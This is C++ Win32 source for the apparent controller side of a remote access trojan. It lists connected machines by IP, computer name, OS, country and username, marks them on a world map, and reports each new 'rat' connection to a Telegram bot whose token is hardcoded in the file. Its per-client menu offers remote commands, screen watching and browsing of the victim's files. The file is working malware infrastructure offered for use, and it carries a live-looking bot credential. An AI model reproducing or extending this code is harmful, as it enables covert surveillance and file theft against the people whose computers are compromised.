#include "server.h"
#include "WndRegisters.h"
#include "resources.h"
#include "sockinitialize.h"
#include "sys.h"
#include "wndfuncs.h"
#include "codepoints.h"
#include "countrycoords.h"
#include <set>

HWND hwndList;
HWND hwndButton;
static HWND hwndClient = NULL;
static HWND hwndFTP = NULL;
BOOL ishwndClient = false;
BOOL ishwndFTP = false;
UINT selectedMenuItem;
UINT_PTR timerId;
int itemIndex;
int g_itemIndex = -1;
int counter;

std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
std::string response2;
std::string fIPStr;
std::string response;
std::wstring osVersion;
std::string pcUsername;
std::wstring aCounter;
std::wstring itemFileName;
std::map<int, std::wstring> clientItems;
std::set<std::wstring> connectedClients;

typedef struct _DOT {
    int dotX;
    int dotY;
    int dotRadius;
} DOT;

DOT dots[MAX_DOTS];
std::map<SOCKET, int> clientToDotMap;

int numDots = 0;

struct Coordinates {
    int x;
    int y;
};

size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append((char*)ptr, size * nmemb);
    return size * nmemb;
}


int ListenOnPort(HWND hwnd, int portno)
{
    int error = WSAStartup(0x0202, &w);

    if (error)
    {
        return false;
    }

    if (w.wVersion != 0x0202)
    {
        WSACleanup();
        return false;
    }


    addr.sin_family = AF_INET;
    addr.sin_port = htons(portno);

    addr.sin_addr.s_addr = inet_addr(ServerIP);

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (s == INVALID_SOCKET)
    {
        return false;
    }

    if (bind(s, (LPSOCKADDR)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cout << "Error binding to port: " << error << std::endl;
        exit(1);
        return false;
    }


    listen(s, SOMAXCONN);
    int sizenewSockAddr = sizeof(newSockAddr);

    int errrs = 0;
    int optLen = sizeof(error);

    // Check if the socket is not listening
    if (getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&errrs, &optLen) < 0 || errrs == WSAEINVAL)
    {
        std::cout << "Socket is not listening" << std::endl;
    }
    else
    {
        std::cout << "Socket is listening" << std::endl;
    }


    int result = WSAAsyncSelect(s, hwnd, WM_SOCKET, (FD_ACCEPT | FD_READ | FD_CONNECT | FD_CLOSE));
    if (result == SOCKET_ERROR)
    {

    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        if (msg.message == WM_SOCKET)
        {
            if (WSAGETSELECTERROR(msg.lParam) != 0)
            {

            }
            else
            {
                switch (WSAGETSELECTEVENT(msg.lParam))
                {
                case FD_ACCEPT:
                {
                    newSd = accept(s, (sockaddr*)&newSockAddr, &sizenewSockAddr);
                    if (newSd > 0)
                    {
                        char* ip = inet_ntoa(newSockAddr.sin_addr);
                        size_t len = strlen(ip);
                        wchar_t* wip = new wchar_t[len + 1];
                        mbstowcs(wip, ip, len + 1);
                        std::wstring wipStr(wip);

                        auto add = connectedClients.insert(wipStr);
                        if (!add.second)
                        {
                            // IP address already exists in the set, so close the connection
                            //closesocket(newSd);
                        }
                        //add to else the rest of the code

                        OutputDebugStringW(L"\nAccepted!\n");
                        clientSockets.push_back(newSd);
                        std::string message = "Tato sprava bola poslana zo serveru.";

                        for (auto& sAll : clientSockets)
                        {

                            send(sAll, message.c_str(), message.size(), 0);
                        }

                        int error = WSAAsyncSelect(newSd, hwnd, WM_SOCKET, FD_READ);
                        if (error == 0)
                        {

                        }

                        SendMessageW(hwnd, WM_SOCKET, NULL, FD_CONNECT);

                    }
                    break;
                }
                }
            }
        }
        else
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
}

void CloseConnection(void)
{
    if (s)
        closesocket(s);

    WSACleanup();
}

void TelegramServerStatus(boolean online)
{
    std::string response3;
    std::string acPoint = "chat_id=-893691554&text=";
    std::string txtmsg_chars;

    if (!online)
    {
        txtmsg_chars = acPoint + "[" + reddotEmoji + "]" + " SERVER CLOSED | OFFLINE " + "[" + reddotEmoji + "]";
    }
    else
    {
        txtmsg_chars = acPoint + "[" + greendotEmoji + "]" + " SERVER ONLINE " + "[" + greendotEmoji + "]";
    }
    
    const char* txtmsg_char = txtmsg_chars.c_str();

    CURLM* multiHandle4 = curl_multi_init();

    // Create a list of easy handles to add to the multi handle
    std::vector<CURL*> easyHandles;
    CURL* curl4 = curl_easy_init();
    if (curl4) {
        curl_easy_setopt(curl4, CURLOPT_URL, "https://api.telegram.org/bot5781417296:AAEBpOKMGE_QDYsJu5nqQiXFXyWCU-fgDN0/sendMessage");
        curl_easy_setopt(curl4, CURLOPT_POSTFIELDS, txtmsg_char);
        curl_easy_setopt(curl4, CURLOPT_WRITEFUNCTION, writeFunction);
        curl_easy_setopt(curl4, CURLOPT_WRITEDATA, &response3);

        easyHandles.push_back(curl4);
    }

    // Add the easy handles to the multi handle
    for (CURL* easyHandle : easyHandles) {
        curl_multi_add_handle(multiHandle4, easyHandle);
    }

    // Perform the requests in a non-blocking manner
    int stillRunning = 1;
    while (stillRunning) {
        curl_multi_perform(multiHandle4, &stillRunning);

        // Check for completed transfers
        int msgsInQueue;
        CURLMsg* msg;
        while ((msg = curl_multi_info_read(multiHandle4, &msgsInQueue))) {
            if (msg->msg == CURLMSG_DONE) {
                // Get the easy handle and response data for the completed transfer
                CURL* easyHandle = msg->easy_handle;
                char* response;
                curl_easy_getinfo(easyHandle, CURLINFO_PRIVATE, &response);

                // Handle the response as needed
                if (msg->data.result == CURLE_OK) {
                    // Handle successful response
                    // ...

                }
                else {
                    // Handle error response
                    // ...
                }

                // Remove the easy handle from the multi handle and clean it up
                curl_multi_remove_handle(multiHandle4, easyHandle);
                curl_easy_cleanup(easyHandle);
                free(response);
            }
        }

        // Wait for activity on the handles using the multi handle timeout
        int numFds;
        int selectResult = curl_multi_wait(multiHandle4, NULL, 0, 1000, &numFds);
        if (selectResult != CURLM_OK) {
            // Handle error
            // ...
        }
    }

    // Clean up the multi handle
    curl_multi_cleanup(multiHandle4);
}

std::wstring GetCurrentSocketFromVector()
{
    SOCKET selectedSocket = clientSockets[itemIndex];
    auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
    if (it != clientSockets.end())
    {
        LVITEM lvItem;
        lvItem.mask = LVIF_TEXT;
        lvItem.iItem = itemIndex;
        lvItem.iSubItem = 0;
        lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
        lvItem.cchTextMax = sizeof(aCounter);

        ListView_GetItem(hwndList, &lvItem);


        int socketIndex = std::distance(clientSockets.begin(), it);
    }

    return aCounter;
}


void RequestUsername(HWND hwnd,int timerId)
{
    SOCKET selectedSocket = clientSockets[itemIndex];
    auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
    send(selectedSocket, "requsr", strlen("requsr"), 0);

    SetTimer(hwnd, timerId, 100, NULL);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    int bytesRec;
    int client_fd;
    switch (msg)
    {
    case WM_SOCKET:
    {
        switch (WSAGETSELECTEVENT(lParam))
        {
        case FD_CLOSE:
            break;

        case FD_ACCEPT:

            break;

        case FD_CONNECT:
            if(addedClients.find(newSd) == addedClients.end())
            {
                //Get IP
                addedClients.insert(newSd);
                socklen_t addrLen = sizeof(newSockAddr);
                int result = getpeername(newSd, (sockaddr*)&newSockAddr, &addrLen);
                char* ip = inet_ntoa(newSockAddr.sin_addr);
                size_t len = strlen(ip);
                wchar_t* wip = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
                mbstowcs(wip, ip, len + 1);
                wchar_t* ll = wip;
                aCounter = L"user" + std::to_wstring(counter) + L" " + wip;
                std::wstring thisItemName = L"Client " + std::to_wstring(counter);
                wchar_t* FinalIP = new wchar_t[aCounter.length() + 1];
                wcscpy(FinalIP, aCounter.c_str());

                LVITEM item;
                item.mask = LVIF_TEXT | LVIF_PARAM;
                item.iItem = ListView_GetItemCount(hwndList);
                item.iSubItem = 0;
                item.pszText = FinalIP;
                item.lParam = newSd;

                SendMessageW(hwndList, LVM_SETTEXTCOLOR, (WPARAM)0, (LPARAM)RGB(122, 5, 5));
                int itemIndex = ListView_InsertItem(hwndList, &item);
                g_itemIndex = itemIndex;
                clientItems.insert(std::make_pair(counter, thisItemName));

                //OS
                osVersion = getSysOpType();
                ListView_SetItemText(hwndList, itemIndex, 2, const_cast<LPWSTR>(osVersion.c_str()));

                //PC Name
                
                DWORD size = sizeof(computerName) / sizeof(computerName[0]);
                if (GetComputerNameW(computerName, &size)) {
                    std::wstring pcName = computerName;
                    ListView_SetItemText(hwndList, itemIndex, 1, (LPWSTR)pcName.c_str());
                }
                else {
                    // handle error
                }

                RequestUsername(hwnd,1091);
                
                fIPStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(wip);

                CURLM* multiHandle = curl_multi_init();

                // Create a CURL handle for each URL to fetch
                CURL* curl1 = curl_easy_init();
                std::string url1 = "https://ipapi.co/" + fIPStr + "/country_name";
                std::string response1;
                curl_easy_setopt(curl1, CURLOPT_URL, url1.c_str());
                curl_easy_setopt(curl1, CURLOPT_WRITEFUNCTION, writeFunction);
                curl_easy_setopt(curl1, CURLOPT_WRITEDATA, &response1);
                curl_multi_add_handle(multiHandle, curl1);

                CURL* curl2 = curl_easy_init();
                std::string url2 = "https://ipapi.co/" + fIPStr + "/country_code";
                std::string response2;
                curl_easy_setopt(curl2, CURLOPT_URL, url2.c_str());
                curl_easy_setopt(curl2, CURLOPT_WRITEFUNCTION, writeFunction);
                curl_easy_setopt(curl2, CURLOPT_WRITEDATA, &response2);
                curl_multi_add_handle(multiHandle, curl2);

                // Process the requests
                int runningHandles = 0;
                do {
                    curl_multi_perform(multiHandle, &runningHandles);

                    int numMessages = 0;
                    CURLMsg* message;
                    while ((message = curl_multi_info_read(multiHandle, &numMessages))) {
                        if (message->msg == CURLMSG_DONE) {
                            CURL* curl = message->easy_handle;
                            CURLcode res = message->data.result;
                            if (res == CURLE_OK) {
                                if (curl == curl1) {
                                    std::wstring responseW = converter.from_bytes(response1);
                                    ListView_SetItemText(hwndList, itemIndex, 3, (LPWSTR)responseW.c_str());
                                }
                                else if (curl == curl2) {
                                    for (int i = 0; i < clientSockets.size(); i++) {
                                        clientToDotMap[clientSockets[i]] = i;
                                    }
                                    std::map<std::string, Coordinates> countryCoords;
                                    Country country;
                                    srand(time(0));
                                    countryCoords["SK"] = { country.SKx, country.SKy };
                                    countryCoords["US"] = { country.USx, country.USy };
                                    countryCoords["CZ"] = { country.CZx, country.CZy };
                                    countryCoords["Undefined"] = { country.CNx, country.CNy };
                                    auto coords = countryCoords[response2];
                                    DOT newDot;

                                    newDot.dotX = coords.x;
                                    newDot.dotY = coords.y;
                                    newDot.dotRadius = 4;

                                    // Add the new dot to the dots array
                                    dots[numDots] = newDot;
                                    numDots++;

                                    // Redraw the window to display the new dot
                                    InvalidateRect(hwnd, NULL, TRUE);
                                }
                            }
                            else {
                                std::cerr << "cURL error: " << curl_easy_strerror(res) << std::endl;
                            }
                            curl_multi_remove_handle(multiHandle, curl);
                            curl_easy_cleanup(curl);
                        }
                    }
                } while (runningHandles > 0);

                // Cleanup
                curl_multi_cleanup(multiHandle);

                CURL* curl3;
                CURLcode res;
                std::string response3;
                std::string OSstr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(osVersion);
                std::string pcNameStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(computerName);

                if (response2 == "CZ")
                {
                    flagEmoji = u8"\U0001F1E8\U0001F1FF";
                }
                if (response2 == "Undefined")
                {
                    flagEmoji = u8"\U0001F3F4";
                }


                std::string userCount = " : " + std::to_string(counter) + "\n";
                std::string ipPrint = " IP ADDRESS : " + fIPStr + "\n";
                std::string osPrint = " OPERATION SYSTEM : " + OSstr + "\n";
                std::string countryPrint = " COUNTRY : " + response1 + "\n";
                std::string pcnamePrint = " COMPUTER NAME : " + pcNameStr + "\n";
                std::string txtmsg = "chat_id=" + chat_id + "&text=" +
                    ratEmoji + " " + dollarEmoji + " " + resulttitle() + " " + dollarEmoji + " " + ratEmoji + "\n" +
                    greendotEmoji + " CONNECTED " + greendotEmoji + "\n" +
                    IDemoji + userCount +
                    IPemoji + ipPrint +
                    OSemoji + osPrint +
                    flagEmoji + countryPrint +
                    pcnameEmoji + pcnamePrint;

                const char* txtmsg_char = txtmsg.c_str();

                CURLM* multiHandle4 = curl_multi_init();

                // Create a list of easy handles to add to the multi handle
                std::vector<CURL*> easyHandles;
                CURL* curl4 = curl_easy_init();
                if (curl4) {
                    curl_easy_setopt(curl4, CURLOPT_URL, "https://api.telegram.org/bot5781417296:AAEBpOKMGE_QDYsJu5nqQiXFXyWCU-fgDN0/sendMessage");
                    curl_easy_setopt(curl4, CURLOPT_POSTFIELDS, txtmsg_char);
                    curl_easy_setopt(curl4, CURLOPT_WRITEFUNCTION, writeFunction);
                    curl_easy_setopt(curl4, CURLOPT_WRITEDATA, &response3);

                    easyHandles.push_back(curl4);
                }

                // Add the easy handles to the multi handle
                for (CURL* easyHandle : easyHandles) {
                    curl_multi_add_handle(multiHandle4, easyHandle);
                }

                // Perform the requests in a non-blocking manner
                int stillRunning = 1;
                while (stillRunning) {
                    curl_multi_perform(multiHandle4, &stillRunning);

                    // Check for completed transfers
                    int msgsInQueue;
                    CURLMsg* msg;
                    while ((msg = curl_multi_info_read(multiHandle4, &msgsInQueue))) {
                        if (msg->msg == CURLMSG_DONE) {
                            // Get the easy handle and response data for the completed transfer
                            CURL* easyHandle = msg->easy_handle;
                            char* response;
                            curl_easy_getinfo(easyHandle, CURLINFO_PRIVATE, &response);

                            // Handle the response as needed
                            if (msg->data.result == CURLE_OK) {
                                // Handle successful response
                                // ...

                            }
                            else {
                                // Handle error response
                                // ...
                            }

                            // Remove the easy handle from the multi handle and clean it up
                            curl_multi_remove_handle(multiHandle4, easyHandle);
                            curl_easy_cleanup(easyHandle);
                            free(response);
                        }
                    }

                    // Wait for activity on the handles using the multi handle timeout
                    int numFds;
                    int selectResult = curl_multi_wait(multiHandle4, NULL, 0, 1000, &numFds);
                    if (selectResult != CURLM_OK) {
                        // Handle error
                        // ...
                    }
                }

                // Clean up the multi handle
                curl_multi_cleanup(multiHandle4);

                

                SetTimer(hwnd, 1087, 500, NULL);


                if (itemIndex != -1)
                {
                    counter++;
                }
            }
            SetTimer(hwnd, 12, 1000, NULL);
            break;

        case FD_READ:
            OutputDebugStringW(L"\nREADING!\n");

            InitCommonControls();

            SetTimer(hwnd, 12, 1000, NULL);

            //SendMessageW(hwnd, WM_SOCKET, NULL, FD_CONNECT);

            break;
        }
    }


    case WM_TIMER:
    {
        if (wParam == 12)
        {
            for (auto it = clientSockets.begin(); it != clientSockets.end();)
            {
                char buffer[1024];
                int bytesReceived = recv(*it, &buffer[0], 1024, 0);
                if (bytesReceived == 0 || (bytesReceived == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET))
                {
                    // Find the index of the current client socket in the list view control
                    int itemIndex = -1;
                    for (int i = 0; i < ListView_GetItemCount(hwndList); i++)
                    {
                        LVITEM item;
                        item.mask = LVIF_PARAM;
                        item.iItem = i;
                        ListView_GetItem(hwndList, &item);
                        if (item.lParam == *it)
                        {
                            itemIndex = i;
                            break;
                        }
                    }

                    auto dotIndex = clientToDotMap.find(*it);
                    if (itemIndex != -1 && dotIndex != clientToDotMap.end())
                    {
                        int dotIndexValue = dotIndex->second;
                        for (int i = dotIndexValue; i < numDots - 1; i++) {
                            dots[i] = dots[i + 1];
                        }
                        numDots--;

                        InvalidateRect(hwnd, NULL, TRUE);

                        SendMessageW(hwndList, LVM_DELETEITEM, (WPARAM)itemIndex, 0);

                        clientToDotMap.erase(dotIndex);
                    }

                addedClients.erase(*it); // Remove the client from the addedClients set
                closesocket(*it);
                it = clientSockets.erase(it); // Remove the client from the clientSockets vector

                }
                else
                {
                    ++it;
                    std::cout << "DATA RECV" << std::endl;
                }
            
            }
        }
        if (wParam == 1091)
        {
            SOCKET selectedSocket = clientSockets[g_itemIndex];
            char buffer[1024];
            int bytesReceived = recv(selectedSocket, buffer, sizeof(buffer), 0);
            if (bytesReceived > 0)
            {
                // Handle successful receive
                std::string usernameStr(buffer, buffer + bytesReceived);
                pcUsername = usernameStr;
                
                //MessageBoxW(NULL, usrName.c_str(), L"s", MB_OK);
                KillTimer(hwnd, 1091);
            }
            else if (bytesReceived == 0 || (bytesReceived == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET))
            {
                // Handle socket error or disconnection
                KillTimer(hwnd, 1091);
            }
        }

        if (wParam == 1087)
        {
            std::wstring usrName = converter.from_bytes(pcUsername);
            ListView_SetItemText(hwndList, itemIndex, 4, (LPWSTR)usrName.c_str());
            KillTimer(hwnd, 1087);
        }


        if (wParam == 1069)
        {
            for (int i = 0; i < numDots; i++) {
                // Update the size of the dots
                if (dots[i].dotRadius > 4) {
                    dots[i].dotRadius--;
                }
                else {
                    dots[i].dotRadius++;
                }
            }

            // Redraw the window
            InvalidateRect(hwnd, NULL, TRUE);
            UpdateWindow(hwnd);
        }
        break;
    }
    

    case WM_CREATE:
        hwndList = CreateWindowW(WC_LISTVIEW, L"",
            WS_VISIBLE | WS_BORDER | WS_CHILD | LVS_REPORT | LVS_SINGLESEL | LVS_EDITLABELS,
            10, 10, 900, 300,
            hwnd, (HMENU)20, hInstance, 0);


        CreateColumn(hwndList, 25, 100, (wchar_t*)L"Connections");
        CreateColumn(hwndList, 25, 130, (wchar_t*)L"PC Name");
        CreateColumn(hwndList, 25, 100, (wchar_t*)L"Operation Sys");
        CreateColumn(hwndList, 25, 100, (wchar_t*)L"Country");
        CreateColumn(hwndList, 25, 130, (wchar_t*)L"User");
        SendMessageW(hwndList, LVM_SETBKCOLOR, 0, (LPARAM)clrRed);

        timerId = SetTimer(hwnd, 12, 1000, NULL);
        SetTimer(hwnd, 1069, 200, NULL);

        OnCreate(hwnd,wParam,lParam);
        break;

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        hdcMap = BeginPaint(hwnd, &ps);

        // Get the device context for the entire window
        HDC hMemDC = CreateCompatibleDC(hdcMap);
        SelectObject(hMemDC, hMap);

        // Get the width and height of the BMP image
        BITMAP bmp;
        GetObject(hMap, sizeof(BITMAP), &bmp);

        // Display the BMP map image
        BitBlt(hdcMap, 30, 400, bmp.bmWidth, bmp.bmHeight, hMemDC, 0, 0, SRCCOPY);

        for (int i = 0; i < numDots; i++) {
            HBRUSH hBrushMap = CreateSolidBrush(RGB(255, 0, 0));
            SelectObject(hdcMap, hBrushMap);
            Ellipse(hdcMap, dots[i].dotX - dots[i].dotRadius, dots[i].dotY - dots[i].dotRadius, dots[i].dotX + dots[i].dotRadius, dots[i].dotY + dots[i].dotRadius);
            DeleteObject(hBrushMap);
        }

        // Release the device context
        DeleteDC(hMemDC);

        EndPaint(hwnd, &ps);
        break;
    }

    case WM_CONTEXTMENU:
    {
        selectedMenuItem = 0;
        POINT cursorPos;
        GetCursorPos(&cursorPos);
        ScreenToClient(hwnd, &cursorPos);

        LVHITTESTINFO hitTestInfo;
        cursorPos.y -= 15;
        cursorPos.x -= 15;
        hitTestInfo.pt = cursorPos;

        itemIndex = ListView_HitTest(hwndList, &hitTestInfo);

        if (itemIndex != -1)
        {
            HMENU hMenu = CreatePopupMenu();

            InsertMenu(hMenu, 0, MF_BYPOSITION, CLIENT_SENDCOMMAND, L"Send Command");
            InsertMenu(hMenu, 1, MF_BYPOSITION, CLIENT_WATCHSCREEN, L"Watch Screen");
            InsertMenu(hMenu, 2, MF_BYPOSITION, CLIENT_FTP, L"File Transfer");
            InsertMenu(hMenu, 3, MF_BYPOSITION, CLIENT_FUN, L"Fun");
            InsertMenu(hMenu, 4, MF_BYPOSITION, CLIENT_REMOVE, L"Remove Client");
            SetMenuItemBitmaps(hMenu, CLIENT_SENDCOMMAND, MF_BYCOMMAND, hCmdItemIcon, hCmdItemIcon);
            SetMenuItemBitmaps(hMenu, CLIENT_WATCHSCREEN, MF_BYCOMMAND, hScreenItemIcon, hScreenItemIcon);
            SetMenuItemBitmaps(hMenu, CLIENT_FUN, MF_BYCOMMAND, hFunItemIcon, hFunItemIcon);
            SetMenuItemBitmaps(hMenu, CLIENT_REMOVE, MF_BYCOMMAND, hRmClientItemIcon, hRmClientItemIcon);
            SetMenuItemBitmaps(hMenu, CLIENT_FTP, MF_BYCOMMAND, hFtpClientItemIcon, hFtpClientItemIcon);

            MENUINFO mi = { 0 };
            mi.cbSize = sizeof(MENUINFO);
            mi.fMask = MIM_BACKGROUND;
            mi.hbrBack = CreateSolidBrush(clrLightRed);

            SetMenuInfo(hMenu, &mi);
            GetCursorPos(&cursorPos);
            TrackPopupMenu(hMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON, cursorPos.x, cursorPos.y, 0, hwnd, NULL);

            selectedMenuItem = 0;
            int menuItemCount = GetMenuItemCount(hMenu);
            for (int i = 0; i < menuItemCount; i++) {
                if (GetMenuState(hMenu, i, MF_BYPOSITION) & MF_CHECKED) {
                    selectedMenuItem = GetMenuItemID(hMenu, i);
                    itemIndex = i;
                    break;
                }
            }
        }

        else
        {
            return 0;
        }

        break;
    }
        


    case WM_COMMAND:
        if (LOWORD(wParam) == 15)
        {
            HWND hEdit = GetDlgItem(hwnd, 14);
            wchar_t text[1024];
            GetWindowText(hEdit, text, sizeof(text));

            std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
            std::string message = converter.to_bytes(text);

            for (auto& sAll : clientSockets)
            {
                send(sAll, message.c_str(), message.size(), 0);
            }

        }

        switch (LOWORD(wParam))
        {

        case CLIENT_SENDCOMMAND:
        {
            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            if (it != clientSockets.end())
            {
                LVITEM lvItem;
                lvItem.mask = LVIF_TEXT;
                lvItem.iItem = itemIndex;
                lvItem.iSubItem = 0;
                lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
                lvItem.cchTextMax = sizeof(aCounter);

                ListView_GetItem(hwndList, &lvItem);

                int socketIndex = std::distance(clientSockets.begin(), it);
                MessageBoxW(NULL, aCounter.c_str(), L"Message", MB_OK);
            }
            break;
        }

        case CLIENT_FTP:
        {
            const int gHwndClientWidth = 600;
            const int gHwndClientHeight = 550;

            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            if (it != clientSockets.end())
            {
                LVITEM lvItem;
                lvItem.mask = LVIF_TEXT;
                lvItem.iItem = itemIndex;
                lvItem.iSubItem = 0;
                lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
                lvItem.cchTextMax = sizeof(aCounter);

                ListView_GetItem(hwndList, &lvItem);


                int socketIndex = std::distance(clientSockets.begin(), it);

                hwndFTP = CreateWindowExW(
                    WS_EX_CLIENTEDGE,
                    g_szClientFTPClassName,
                    aCounter.c_str(),
                    WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_CLIPSIBLINGS,
                    CW_USEDEFAULT, CW_USEDEFAULT, gHwndClientWidth, gHwndClientHeight,
                    hwnd, NULL, hInstance, NULL);


                if (hwndFTP == NULL)
                {
                    return 0;
                }

                ishwndFTP = true;

                ShowWindow(hwndFTP, SW_SHOW);
            }

            break;
        }

        case CLIENT_WATCHSCREEN:
        {
            const int gHwndClientWidth = 800;
            const int gHwndClientHeight = 600;

            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            if (it != clientSockets.end())
            {
                LVITEM lvItem;
                lvItem.mask = LVIF_TEXT;
                lvItem.iItem = itemIndex;
                lvItem.iSubItem = 0;
                lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
                lvItem.cchTextMax = sizeof(aCounter);

                ListView_GetItem(hwndList, &lvItem);

                
                int socketIndex = std::distance(clientSockets.begin(), it);
                
                hwndClient = CreateWindowExW(
                    WS_EX_CLIENTEDGE,
                    g_szClientClassName,
                    aCounter.c_str(),
                    WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_CLIPSIBLINGS,
                    CW_USEDEFAULT, CW_USEDEFAULT, gHwndClientWidth, gHwndClientHeight,
                    hwnd, NULL, hInstance, NULL);


                if (hwndClient == NULL)
                {
                    return 0;
                }

                ishwndClient = true;

                ShowWindow(hwndClient, SW_SHOW);

            }

            break;
        }

        case CLIENT_FUN:
        {
            POINT cursorPos;
            GetCursorPos(&cursorPos);
            ScreenToClient(hwnd, &cursorPos);

            LVHITTESTINFO hitTestInfo;
            cursorPos.y -= 15;
            cursorPos.x -= 15;
            hitTestInfo.pt = cursorPos;

            HMENU hFunMenu = CreatePopupMenu();

            // Add items to the "Fun" sub-menu
            InsertMenu(hFunMenu, 0, MF_BYPOSITION, 1100, L"Fun Item 1");
            InsertMenu(hFunMenu, 1, MF_BYPOSITION, 1101, L"Fun Item 2");

            MENUINFO mi = { 0 };
            mi.cbSize = sizeof(MENUINFO);
            mi.fMask = MIM_BACKGROUND;
            mi.hbrBack = CreateSolidBrush(clrLightRed);

            SetMenuInfo(hFunMenu, &mi);
            GetCursorPos(&cursorPos);
            TrackPopupMenu(hFunMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_NONOTIFY, cursorPos.x, cursorPos.y, 0, hwnd, NULL);

            // Clean up
            DestroyMenu(hFunMenu);
            break;
        }

        case CLIENT_REMOVE:
        {
            SOCKET selectedSocket = clientSockets[itemIndex];
            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
            if (it != clientSockets.end())
            {
                clientSockets.erase(it);
                ListView_DeleteItem(hwndList, itemIndex);
            }
            break;
        }
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }

        break;

    case WM_CLOSE:
    {
        TelegramServerStatus(false);
        DestroyWindow(hwnd);
        CloseConnection();
        ExitProcess(0);
        break;
    }

    case WM_DESTROY:
    {
        CloseConnection();
        ExitProcess(0);
        break;
    }
    
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
};

HWND hFtpList;
LVCOLUMN lvColumn = { 0 };
SOCKET FTPSOCK;
FtpMenu ftpmenu;

LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {

    case WM_CREATE:
    {
        FTPSOCK = clientSockets[itemIndex];
        auto it = std::find(clientSockets.begin(), clientSockets.end(), FTPSOCK);
        
        hFtpList = CreateWindowW(WC_LISTVIEW, L"", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SINGLESEL,
            10, 10, 500, 300, FtpHwnd, NULL, GetModuleHandle(NULL), NULL);

        // Add columns to the list control
        lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
        lvColumn.pszText = (LPWSTR)L"Name";
        lvColumn.cx = 200;
        ListView_InsertColumn(hFtpList, 0, &lvColumn);

        lvColumn.pszText = (LPWSTR)L"Size";
        lvColumn.cx = 100;
        ListView_InsertColumn(hFtpList, 1, &lvColumn);

        SetTimer(FtpHwnd, 1440, 100, NULL);
        break;
    }

    case WM_NOTIFY:
    {
        if (((LPNMHDR)lParam)->code == NM_DBLCLK)
        {
            int itemIndex = ListView_GetNextItem(hFtpList, -1, LVNI_SELECTED);
            if (itemIndex != -1)
            {
                // Check if the selected item is a folder
                wchar_t buffer[MAX_PATH];
                LVITEM lvItem = { 0 };
                lvItem.mask = LVIF_TEXT;
                lvItem.iItem = itemIndex;
                lvItem.iSubItem = 0;
                lvItem.pszText = buffer;
                lvItem.cchTextMax = MAX_PATH;
                ListView_GetItem(hFtpList, &lvItem);

                std::wstring selectedName = lvItem.pszText;
                if (selectedName != L".." && (ListView_GetItemState(hFtpList, itemIndex, LVIS_CUT) & LVIS_CUT) == 0)
                {
                    std::wstring request = L"requestdirs " + selectedName;
                    int len = WideCharToMultiByte(CP_UTF8, 0, request.c_str(), request.length(), NULL, 0, NULL, NULL);
                    std::vector<char> requestBuffer(len + 1);
                    WideCharToMultiByte(CP_UTF8, 0, request.c_str(), request.length(), requestBuffer.data(), len, NULL, NULL);
                    int x = send(FTPSOCK, requestBuffer.data(), requestBuffer.size(), 0);

                    Sleep(100);

                    char buffer[4096];
                    int lenRecv = recv(FTPSOCK, buffer, sizeof(buffer), 0);
                    if (lenRecv > 0)
                    {
                        //MessageBoxA(NULL, std::to_string(len).c_str(), "hi", MB_OK);

                        ftpmenu.UpdateItems(FtpHwnd, hFtpList, buffer, lenRecv);
                    }
                }
            }
        }
        break;
    }

    case WM_TIMER:
    {
        if (LOWORD(wParam == 1440))
        {
            send(FTPSOCK, "requestdirs", strlen("requestdirs"), 0);

            Sleep(100);

            char buffer[4096];
            int len = recv(FTPSOCK, buffer, sizeof(buffer), 0);
            if (len > 0)
            {

                ftpmenu.UpdateItems(FtpHwnd, hFtpList, buffer, len);
                KillTimer(FtpHwnd, 1440);
            }
            else if (len == 0)
            {
                // Client disconnected
                closesocket(FTPSOCK);
            }
            KillTimer(FtpHwnd, 1440);
        }

        break;
    }

    case WM_DESTROY:
    {
        DestroyWindow(hwndFTP);
        break;
    }


    case WM_CLOSE:
    {
        SendMessage(FtpHwnd, WM_DESTROY, NULL, NULL);
        break;
    }

    default:
        return DefWindowProc(FtpHwnd, uMsg, wParam, lParam);
    }

    return 0;
}


LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    std::vector<char> buffer;
    std::unique_ptr<char[]> imageBuffer;

    switch (uMsg)
    {

    case WM_CREATE:
    {
